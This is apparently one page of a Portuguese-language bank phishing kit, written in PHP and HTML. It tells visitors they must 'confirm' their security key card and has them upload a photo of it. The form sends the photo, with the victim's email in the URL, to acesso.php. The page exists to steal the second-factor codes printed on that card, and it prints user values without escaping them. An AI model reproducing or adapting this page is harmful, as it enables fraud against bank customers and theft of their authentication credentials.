<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Masterização</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Confirmação de chaves.</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Para prosseguir com segurança, será preciso confirmar e regularizar seu Cartão Chave de Segurança.';
					else:
						echo $_SESSION['UserName'].', para prosseguir com segurança, será preciso confirmar e regularizar seu Cartão Chave de Segurança.';
					endif;
				?>	
				<br><br>
				Para confirmar suas chaves de segurança envie-nos uma foto do seu cartão chave.
				<br><br>
				Siga os passos abaixo para continuar.
			</p>
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkFormAcesso();" method="post" enctype="multipart/form-data">
			<div class="block_list">1º: Clique no botão "Validar Chaves de Segurança".</div>
			<div class="block_list">2º: Na janela que se abrirá, tire uma foto do seu Cartão Chave de Segurança.</div>
			<div class="block_list">3º: Ao finalizar, clique em "Confirmar Chaves de Segurança".</div>

			<div class="block_labels input_file">
				<label for="arquivo" class="JSome">
					<input type="file" name="arquivo" id="arquivo" class="main_arquivo" onchange="return getmms(this.form.arquivo.value);">
					<button class="btn-submit-complete main_button JGetImage"><i class="fa fa-camera"></i> Validar Chaves de Segurança</button>
				</label>
				<input type="hidden" name="sender" value="send_table">
				<button class="btn-submit-complete JCheckImage" style="display:none;"><i class="fa fa-check-square"></i> Confirmar Chaves de Segurança</button>
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->

</body>
</html>
<?php ob_end_flush(); ?>